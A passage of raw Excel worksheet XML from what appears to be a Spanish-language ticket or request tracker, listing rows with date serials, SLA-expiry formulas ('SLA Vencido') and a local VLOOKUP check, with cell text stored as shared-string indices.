      <c r="AG136" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH136" t="str">
        <f>IFERROR(VLOOKUP(H136,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="137" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A137" s="5">
        <v>136</v>
      </c>
      <c r="B137" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C137" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D137" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E137" s="4"/>
      <c r="F137" s="4"/>
      <c r="G137" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H137" s="4" t="s">
        <v>515</v>
      </c>
      <c r="I137" s="4"/>
      <c r="J137" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K137" s="4"/>
      <c r="L137" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M137" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N137" s="5"/>
      <c r="O137" s="6"/>
      <c r="P137" s="6"/>
      <c r="Q137" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R137" s="4"/>
      <c r="S137" s="22"/>
      <c r="T137" s="8">
        <v>44204</v>
      </c>
      <c r="U137" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V137" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W137" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X137" s="12"/>
      <c r="Y137" s="11"/>
      <c r="Z137" s="11"/>
      <c r="AA137" s="8">
        <v>44242</v>
      </c>
      <c r="AB137" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC137" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD137" s="32"/>
      <c r="AE137" s="8">
        <v>44247</v>
      </c>
      <c r="AF137" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG137" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH137" t="str">
        <f>IFERROR(VLOOKUP(H137,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="138" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A138" s="5">
        <v>137</v>
      </c>
      <c r="B138" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C138" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D138" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E138" s="4"/>
      <c r="F138" s="4"/>
      <c r="G138" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H138" s="4" t="s">
        <v>516</v>
      </c>
      <c r="I138" s="4"/>
      <c r="J138" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K138" s="4"/>
      <c r="L138" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M138" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N138" s="5"/>
      <c r="O138" s="6"/>
      <c r="P138" s="6"/>
      <c r="Q138" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R138" s="4"/>
      <c r="S138" s="22"/>
      <c r="T138" s="8">
        <v>44204</v>
      </c>
      <c r="U138" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V138" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W138" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X138" s="12"/>
      <c r="Y138" s="11"/>
      <c r="Z138" s="11"/>
      <c r="AA138" s="8">
        <v>44242</v>
      </c>
      <c r="AB138" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC138" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD138" s="32"/>
      <c r="AE138" s="8">
        <v>44247</v>
      </c>
      <c r="AF138" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG138" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH138" t="str">
        <f>IFERROR(VLOOKUP(H138,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="139" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A139" s="5">
        <v>138</v>
      </c>
      <c r="B139" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C139" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D139" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E139" s="4"/>
      <c r="F139" s="4"/>
      <c r="G139" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H139" s="4" t="s">
        <v>517</v>
      </c>
      <c r="I139" s="4"/>
      <c r="J139" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K139" s="4"/>
      <c r="L139" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M139" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N139" s="5"/>
      <c r="O139" s="6"/>
      <c r="P139" s="6"/>
      <c r="Q139" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R139" s="4"/>
      <c r="S139" s="22"/>
      <c r="T139" s="8">
        <v>44204</v>
      </c>
      <c r="U139" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V139" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W139" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X139" s="12"/>
      <c r="Y139" s="11"/>
      <c r="Z139" s="11"/>
      <c r="AA139" s="8">
        <v>44242</v>
      </c>
      <c r="AB139" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC139" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD139" s="32"/>
      <c r="AE139" s="8">
        <v>44247</v>
      </c>
      <c r="AF139" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG139" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH139" t="str">
        <f>IFERROR(VLOOKUP(H139,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="140" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A140" s="5">
        <v>139</v>
      </c>
      <c r="B140" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C140" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D140" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E140" s="4"/>
      <c r="F140" s="4"/>
      <c r="G140" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H140" s="4" t="s">
        <v>518</v>
      </c>
      <c r="I140" s="4"/>
      <c r="J140" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K140" s="4"/>
      <c r="L140" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M140" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N140" s="5"/>
      <c r="O140" s="6"/>
      <c r="P140" s="6"/>
      <c r="Q140" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R140" s="4"/>
      <c r="S140" s="22"/>
      <c r="T140" s="8">
        <v>44204</v>
      </c>
      <c r="U140" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V140" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W140" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X140" s="12"/>
      <c r="Y140" s="11"/>
      <c r="Z140" s="11"/>
      <c r="AA140" s="8">
        <v>44242</v>
      </c>
      <c r="AB140" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC140" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD140" s="32"/>
      <c r="AE140" s="8">
        <v>44247</v>
      </c>
      <c r="AF140" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG140" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH140" t="str">
        <f>IFERROR(VLOOKUP(H140,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="141" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A141" s="5">
        <v>140</v>
      </c>
      <c r="B141" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C141" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D141" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E141" s="4"/>
      <c r="F141" s="4"/>
      <c r="G141" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H141" s="4" t="s">
        <v>519</v>
      </c>
      <c r="I141" s="4"/>
      <c r="J141" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K141" s="4"/>
      <c r="L141" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M141" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N141" s="5"/>
      <c r="O141" s="6"/>
      <c r="P141" s="6"/>
      <c r="Q141" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R141" s="4"/>
      <c r="S141" s="22"/>
      <c r="T141" s="8">
        <v>44204</v>
      </c>
      <c r="U141" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>2005</v>
      </c>
      <c r="V141" s="8">
        <f t="shared" si="7"/>
        <v>44294</v>
      </c>
      <c r="W141" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X141" s="12"/>
      <c r="Y141" s="11"/>
      <c r="Z141" s="11"/>
      <c r="AA141" s="8">
        <v>44242</v>
      </c>
      <c r="AB141" s="32" t="s">
        <v>495</v>
      </c>
      <c r="AC141" s="32" t="s">
        <v>510</v>
      </c>
      <c r="AD141" s="32"/>
      <c r="AE141" s="8">
        <v>44247</v>
      </c>
      <c r="AF141" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG141" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH141" t="str">
        <f>IFERROR(VLOOKUP(H141,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="142" spans="1:34" ht="116" hidden="1" x14ac:dyDescent="0.35">
      <c r="A142" s="5">
        <v>141</v>
      </c>
      <c r="B142" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C142" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D142" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E142" s="4"/>
      <c r="F142" s="4"/>
      <c r="G142" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H142" s="4" t="s">
        <v>520</v>
      </c>
      <c r="I142" s="4"/>
      <c r="J142" s="4" t="s">
        <v>521</v>
      </c>
      <c r="K142" s="4"/>
      <c r="L142" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M142" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N142" s="5"/>
      <c r="O142" s="6"/>
      <c r="P142" s="6"/>
      <c r="Q142" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R142" s="4"/>
      <c r="S142" s="22"/>
      <c r="T142" s="8">
        <v>44210</v>
      </c>
      <c r="U142" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1999</v>
      </c>
      <c r="V142" s="8">
        <f t="shared" si="7"/>
        <v>44240</v>
      </c>
      <c r="W142" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X142" s="12"/>
      <c r="Y142" s="11"/>
      <c r="Z142" s="11"/>
      <c r="AA142" s="8">
        <v>44263</v>
      </c>
      <c r="AB142" s="32" t="s">
        <v>523</v>
      </c>
      <c r="AC142" s="32" t="s">
        <v>524</v>
      </c>
      <c r="AD142" s="32" t="s">
        <v>525</v>
      </c>
      <c r="AE142" s="8">
        <v>44267</v>
      </c>
      <c r="AF142" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG142" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH142" t="str">
        <f>IFERROR(VLOOKUP(H142,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="143" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A143" s="5">
        <v>142</v>
      </c>
      <c r="B143" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C143" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D143" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E143" s="4"/>
      <c r="F143" s="4"/>
      <c r="G143" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H143" s="4" t="s">
        <v>526</v>
      </c>
      <c r="I143" s="4"/>
      <c r="J143" s="4" t="s">
        <v>527</v>
      </c>
      <c r="K143" s="4"/>
      <c r="L143" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M143" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N143" s="5"/>
      <c r="O143" s="6"/>
      <c r="P143" s="6"/>
      <c r="Q143" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R143" s="4"/>
      <c r="S143" s="22"/>
      <c r="T143" s="8">
        <v>44210</v>
      </c>
      <c r="U143" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1999</v>
      </c>
      <c r="V143" s="8">
        <f t="shared" si="7"/>
        <v>44240</v>
      </c>
      <c r="W143" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X143" s="12"/>
      <c r="Y143" s="11"/>
      <c r="Z143" s="11"/>
      <c r="AA143" s="8">
        <v>44263</v>
      </c>
      <c r="AB143" s="32" t="s">
        <v>528</v>
      </c>
      <c r="AC143" s="32" t="s">
        <v>524</v>
      </c>
      <c r="AD143" s="32" t="s">
        <v>529</v>
      </c>
      <c r="AE143" s="8">
        <v>44267</v>
      </c>
      <c r="AF143" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG143" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH143" t="str">
        <f>IFERROR(VLOOKUP(H143,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="144" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A144" s="5">
        <v>143</v>
      </c>
      <c r="B144" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C144" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D144" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E144" s="4"/>
      <c r="F144" s="4"/>
      <c r="G144" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H144" s="4" t="s">
        <v>530</v>
      </c>
      <c r="I144" s="4"/>
      <c r="J144" s="4" t="s">
        <v>531</v>
      </c>
      <c r="K144" s="4"/>
      <c r="L144" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M144" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N144" s="5"/>
      <c r="O144" s="6"/>
      <c r="P144" s="6"/>
      <c r="Q144" s="6" t="s">
        <v>447</v>
      </c>
      <c r="R144" s="4"/>
      <c r="S144" s="22"/>
      <c r="T144" s="8">
        <v>44210</v>
      </c>
      <c r="U144" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1999</v>
      </c>
      <c r="V144" s="8">
        <f t="shared" si="7"/>
        <v>44300</v>
      </c>
      <c r="W144" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X144" s="12"/>
      <c r="Y144" s="11"/>
      <c r="Z144" s="11"/>
      <c r="AA144" s="8">
        <v>44784</v>
      </c>
      <c r="AB144" s="32" t="s">
        <v>532</v>
      </c>
      <c r="AC144" s="32" t="s">
        <v>533</v>
      </c>
      <c r="AD144" s="32" t="s">
        <v>534</v>
      </c>
      <c r="AE144" s="27" t="s">
        <v>449</v>
      </c>
      <c r="AF144" s="27"/>
      <c r="AG144" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH144" t="str">
        <f>IFERROR(VLOOKUP(H144,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="145" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A145" s="5">
        <v>144</v>
      </c>
      <c r="B145" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C145" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D145" s="5"/>
      <c r="E145" s="4"/>
      <c r="F145" s="4"/>
      <c r="G145" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H145" s="4" t="s">
        <v>535</v>
      </c>
      <c r="I145" s="4"/>
      <c r="J145" s="4" t="s">
        <v>536</v>
      </c>
      <c r="K145" s="4"/>
      <c r="L145" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M145" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N145" s="5"/>
      <c r="O145" s="6"/>
      <c r="P145" s="6"/>
      <c r="Q145" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R145" s="4"/>
      <c r="S145" s="22"/>
      <c r="T145" s="8">
        <v>44210</v>
      </c>
      <c r="U145" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1999</v>
      </c>
      <c r="V145" s="8">
        <f t="shared" si="7"/>
        <v>44240</v>
      </c>
      <c r="W145" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X145" s="12"/>
      <c r="Y145" s="11"/>
      <c r="Z145" s="11"/>
      <c r="AA145" s="8">
        <v>44270</v>
      </c>
      <c r="AB145" s="32" t="s">
        <v>537</v>
      </c>
      <c r="AC145" s="32" t="s">
        <v>538</v>
      </c>
      <c r="AD145" s="32" t="s">
        <v>539</v>
      </c>
      <c r="AE145" s="8">
        <v>44267</v>
      </c>
      <c r="AF145" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG145" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH145" t="str">
        <f>IFERROR(VLOOKUP(H145,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="146" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A146" s="5">
        <v>145</v>
      </c>
      <c r="B146" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C146" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D146" s="5"/>
      <c r="E146" s="4"/>
      <c r="F146" s="4"/>
      <c r="G146" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H146" s="4" t="s">
        <v>540</v>
      </c>
      <c r="I146" s="4"/>
      <c r="J146" s="4" t="s">
        <v>541</v>
      </c>
      <c r="K146" s="4"/>
      <c r="L146" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M146" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N146" s="5"/>
      <c r="O146" s="6"/>
      <c r="P146" s="6"/>
      <c r="Q146" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R146" s="4"/>
      <c r="S146" s="22"/>
      <c r="T146" s="8">
        <v>44210</v>
      </c>
      <c r="U146" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1999</v>
      </c>
      <c r="V146" s="8">
        <f t="shared" si="7"/>
        <v>44300</v>
      </c>
      <c r="W146" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X146" s="12"/>
      <c r="Y146" s="11"/>
      <c r="Z146" s="11"/>
      <c r="AA146" s="8">
        <v>44225</v>
      </c>
      <c r="AB146" s="32" t="s">
        <v>542</v>
      </c>
      <c r="AC146" s="32" t="s">
        <v>543</v>
      </c>
      <c r="AD146" s="32" t="s">
        <v>544</v>
      </c>
      <c r="AE146" s="8">
        <v>44227</v>
      </c>
      <c r="AF146" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG146" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH146" t="str">
        <f>IFERROR(VLOOKUP(H146,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="147" spans="1:34" ht="304.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A147" s="5">
        <v>146</v>
      </c>
      <c r="B147" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C147" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D147" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E147" s="4"/>
      <c r="F147" s="4"/>
      <c r="G147" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H147" s="4"/>
      <c r="I147" s="4"/>
      <c r="J147" s="4" t="s">
        <v>545</v>
      </c>
      <c r="K147" s="4"/>
      <c r="L147" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M147" s="5" t="s">
        <v>546</v>
      </c>
      <c r="N147" s="5"/>
      <c r="O147" s="6"/>
      <c r="P147" s="6"/>
      <c r="Q147" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R147" s="4"/>
      <c r="S147" s="22"/>
      <c r="T147" s="8">
        <v>44214</v>
      </c>
      <c r="U147" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1995</v>
      </c>
      <c r="V147" s="8">
        <f t="shared" si="7"/>
        <v>44334</v>
      </c>
      <c r="W147" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X147" s="12"/>
      <c r="Y147" s="11"/>
      <c r="Z147" s="11"/>
      <c r="AA147" s="8">
        <v>44295</v>
      </c>
      <c r="AB147" s="32" t="s">
        <v>547</v>
      </c>
      <c r="AC147" s="32" t="s">
        <v>548</v>
      </c>
      <c r="AD147" s="32"/>
      <c r="AE147" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF147" s="27" t="s">
        <v>549</v>
      </c>
      <c r="AG147" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH147" t="str">
        <f>IFERROR(VLOOKUP(H147,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="148" spans="1:34" ht="275.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A148" s="5">
        <v>147</v>
      </c>
      <c r="B148" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C148" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D148" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E148" s="4"/>
      <c r="F148" s="4"/>
      <c r="G148" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H148" s="4" t="s">
        <v>550</v>
      </c>
      <c r="I148" s="4"/>
      <c r="J148" s="4" t="s">
        <v>551</v>
      </c>
      <c r="K148" s="4"/>
      <c r="L148" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M148" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N148" s="5"/>
      <c r="O148" s="6"/>
      <c r="P148" s="6"/>
      <c r="Q148" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R148" s="4"/>
      <c r="S148" s="22"/>
      <c r="T148" s="8">
        <v>44215</v>
      </c>
      <c r="U148" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1994</v>
      </c>
      <c r="V148" s="8">
        <f t="shared" si="7"/>
        <v>44245</v>
      </c>
      <c r="W148" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X148" s="12"/>
      <c r="Y148" s="11"/>
      <c r="Z148" s="11"/>
      <c r="AA148" s="8">
        <v>44257</v>
      </c>
      <c r="AB148" s="32" t="s">
        <v>552</v>
      </c>
      <c r="AC148" s="32" t="s">
        <v>553</v>
      </c>
      <c r="AD148" s="32" t="s">
        <v>554</v>
      </c>
      <c r="AE148" s="8">
        <v>44255</v>
      </c>
      <c r="AF148" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG148" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH148" t="str">
        <f>IFERROR(VLOOKUP(H148,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="149" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A149" s="5">
        <v>148</v>
      </c>
      <c r="B149" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C149" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D149" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E149" s="4"/>
      <c r="F149" s="4"/>
      <c r="G149" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H149" s="4" t="s">
        <v>555</v>
      </c>
      <c r="I149" s="4"/>
      <c r="J149" s="4" t="s">
        <v>556</v>
      </c>
      <c r="K149" s="4"/>
      <c r="L149" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M149" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N149" s="5"/>
      <c r="O149" s="6"/>
      <c r="P149" s="6"/>
      <c r="Q149" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R149" s="4"/>
      <c r="S149" s="22"/>
      <c r="T149" s="8">
        <v>44229</v>
      </c>
      <c r="U149" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1980</v>
      </c>
      <c r="V149" s="8">
        <f t="shared" si="7"/>
        <v>44319</v>
      </c>
      <c r="W149" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X149" s="12"/>
      <c r="Y149" s="11"/>
      <c r="Z149" s="11"/>
      <c r="AA149" s="8">
        <v>44239</v>
      </c>
      <c r="AB149" s="32" t="s">
        <v>557</v>
      </c>
      <c r="AC149" s="32" t="s">
        <v>558</v>
      </c>
      <c r="AD149" s="32"/>
      <c r="AE149" s="8"/>
      <c r="AF149" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG149" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH149" t="str">
        <f>IFERROR(VLOOKUP(H149,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="150" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A150" s="5">
        <v>149</v>
      </c>
      <c r="B150" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C150" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D150" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E150" s="4"/>
      <c r="F150" s="4"/>
      <c r="G150" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H150" s="4" t="s">
        <v>559</v>
      </c>
      <c r="I150" s="4"/>
      <c r="J150" s="4" t="s">
        <v>560</v>
      </c>
      <c r="K150" s="4"/>
      <c r="L150" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M150" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N150" s="5"/>
      <c r="O150" s="6"/>
      <c r="P150" s="6"/>
      <c r="Q150" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R150" s="4"/>
      <c r="S150" s="22"/>
      <c r="T150" s="8">
        <v>44229</v>
      </c>
      <c r="U150" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1980</v>
      </c>
      <c r="V150" s="8">
        <f t="shared" si="7"/>
        <v>44319</v>
      </c>
      <c r="W150" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X150" s="12"/>
      <c r="Y150" s="11"/>
      <c r="Z150" s="11"/>
      <c r="AA150" s="8">
        <v>44239</v>
      </c>
      <c r="AB150" s="32" t="s">
        <v>561</v>
      </c>
      <c r="AC150" s="32" t="s">
        <v>562</v>
      </c>
      <c r="AD150" s="32"/>
      <c r="AE150" s="8"/>
      <c r="AF150" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG150" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH150" t="str">
        <f>IFERROR(VLOOKUP(H150,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="151" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A151" s="5">
        <v>150</v>
      </c>
      <c r="B151" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C151" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D151" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E151" s="4"/>
      <c r="F151" s="4"/>
      <c r="G151" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H151" s="4" t="s">
        <v>563</v>
      </c>
      <c r="I151" s="4"/>
      <c r="J151" s="4" t="s">
        <v>494</v>
      </c>
      <c r="K151" s="4"/>
      <c r="L151" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M151" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N151" s="5"/>
      <c r="O151" s="6"/>
      <c r="P151" s="6"/>
      <c r="Q151" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R151" s="4"/>
      <c r="S151" s="22"/>
      <c r="T151" s="8">
        <v>44229</v>
      </c>
      <c r="U151" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1980</v>
      </c>
      <c r="V151" s="8">
        <f t="shared" si="7"/>
        <v>44319</v>
      </c>
      <c r="W151" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X151" s="12"/>
      <c r="Y151" s="11"/>
      <c r="Z151" s="11"/>
      <c r="AA151" s="8">
        <v>44235</v>
      </c>
      <c r="AB151" s="32" t="s">
        <v>564</v>
      </c>
      <c r="AC151" s="32" t="s">
        <v>565</v>
      </c>
      <c r="AD151" s="32"/>
      <c r="AE151" s="8"/>
      <c r="AF151" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG151" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH151" t="str">
        <f>IFERROR(VLOOKUP(H151,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="152" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A152" s="5">
        <v>151</v>
      </c>
      <c r="B152" s="21" t="s">
        <v>32</v>
